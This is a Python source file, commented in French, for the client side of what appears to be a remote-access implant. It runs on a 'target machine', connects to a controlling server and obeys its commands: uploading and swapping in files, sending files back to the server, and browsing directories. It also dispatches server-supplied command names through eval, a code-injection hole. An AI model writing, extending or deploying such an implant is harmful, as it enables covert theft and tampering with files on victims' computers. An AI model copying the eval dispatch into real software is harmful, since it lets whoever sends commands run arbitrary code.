import os

from ..Connection import DATA_SIZE, Flag, Connection
from ..utils import get_path, path_is_correct, file_is_present, parse_command
from ...MetaData.edit_metadata import replace_file


class Client:
    """
    Classe représentant un client, exécuté sur la machine cible.
    Il reçoit les commandes du serveur.
    """

    def __init__(self, address, port):
        # Utilisation des / plutôt que des \ dans les chemins sur Windows
        self.working_directory = os.getcwd().replace('\\', '/')
        # Connexion au serveur
        self.connection = Connection()
        try:
            self.connection.connect_to_server(address, port)
        except:
            # Le client ne fait que se connecter au serveur, s'il ne peut pas
            # le programme ne sert à rien et il faut donc l'arrêter
            exit(0)
        while self.connection.is_connected():
            # Gestion des commandes reçues
            msg = self.connection.receive_msg()
            args = parse_command(msg)
            action = args[0].lower()
            # Exécution de la commande
            try:
                eval(f"self.{action}")(args)
            except Exception as error:
                self.connection.send_msg(f"Error in command {action}: {error}")

    def put(self, args):
        """
        Reçoit un fichier du serveur
        Commande reçue: 'PUT <destination> [replace]'
        """
        if path_is_correct(args[1]):
            self.connection.send_ack()
            file_name = self.connection.receive_file(args[1])
            if len(args) > 2:
                path_to_replace = args[1]
                replace_file(path_to_replace, args[2], file_name)



        else:
            self.connection.send_error(FileNotFoundError(f"{args[1]} not found"))

    def get(self, args):
        """
        Envoie un fichier au server
        Commande reçue: 'GET <fichier>'
        """
        if file_is_present(args[1]):
            self.connection.send_ack()
            self.connection.send_file(args[1])
        else:
            self.connection.send_error(FileNotFoundError(f"{args[1]} not found"))

    def end(self, args):
        """
        Se déconnecte du serveur
        Commande reçue: 'END'
        """
        self.connection.disconnect()

    def ls(self, args):
        """
        Envoie la liste des fichiers du répertoire courant
        Commande reçue: 'LS [<dossier>]'
        """

        def send(directory_to_show):
            """
            Génère la liste des dossiers et fichiers présents dans le dossier 'directory_to_show'
                par morceaux de DATA_SIZE
            Ordre: dossiers puis fichiers, en ordre alphabétique
            Ex:
                d computer
                d folder
                d zizouuuuuuuuu
                f new.txt
                f old.txt
            """
            to_send = ""
            directories = []
            files = []
            # Sépare les fichiers des dossiers
            for file in sorted(os.listdir(directory_to_show)):
                if os.path.isdir(f"{directory_to_show}/{file}"):
                    directories.append(f"d {file}\n")
                else:
                    files.append(f"f {file}\n")

            # Génération par morceaux
            data_encoded_length = 0
            for file in directories + files:
                for c in file:
                    encoded = c.encode()
                    if data_encoded_length + len(encoded) > DATA_SIZE:
                        yield to_send[0:data_encoded_length]
                        to_send = to_send[data_encoded_length:-1]
                        data_encoded_length = 0
                    to_send += c
                    data_encoded_length += len(encoded)
            if to_send:
                yield to_send

        # Envoie les paquets
        self.connection.send_packet(Flag.DATA, send(get_path(self.working_directory, args[1] if len(args) > 1 else "")))

    def cd(self, args):
        """
        Change de dossier courant
        Commande reçue: 'CD [<dossier>]'
        """
        if len(args) > 1:
            dir = args[1]
            target = dir[:-1] if dir[-1] == '/' and dir != "/" else dir
        else:
            target = os.getcwd()
        working_directory = get_path(self.working_directory, target)
        if path_is_correct(working_directory):
            self.working_directory = working_directory
            self.connection.send_msg(self.working_directory)
        else:
            self.connection.send_error("Path is incorrect")

    def pwd(self, args):
        """
        Affiche le dossier courant
        Commande reçue: 'PWD'
        """
        self.connection.send_msg(self.working_directory)


class ParseError(Exception):
    pass
